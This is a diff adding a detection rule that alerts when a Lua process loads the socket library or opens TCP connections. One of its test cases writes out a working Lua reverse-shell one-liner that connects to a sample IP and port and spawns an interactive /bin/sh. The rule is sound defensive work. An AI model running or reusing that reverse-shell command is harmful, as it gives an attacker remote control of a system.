@@ -1,0 +1,24 @@
+name: rta_lua_socket_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "lua" &&
+    (
+      re_match(e.process_args, "require\\(.*socket.*\\)") ||
+      re_match(e.process_args, "socket\\.tcp\\(") ||
+      re_match(e.process_args, "socket\\.connect\\(")
+    )
+  )
+tests:
+  - cleartext: "lua socket reverse shell"
+    process_name: lua
+    process_args: "lua -e \"require('socket');t=socket.tcp();t:connect('10.10.10.10','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
+    should_match: true
+  - cleartext: "lua socket.tcp connection"
+    process_name: lua
+    process_args: "lua -e 'local socket = require(\"socket\"); local tcp = socket.tcp(); tcp:connect(\"192.168.1.1\", 8080)'"
+    should_match: true
+  - cleartext: "normal lua script"
+    process_name: lua
+    process_args: "lua script.lua"
+    should_match: false
